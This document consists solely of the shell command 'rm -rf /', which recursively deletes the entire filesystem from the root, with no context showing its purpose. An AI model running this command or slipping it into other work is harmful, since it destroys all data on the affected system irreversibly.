rm -rf /
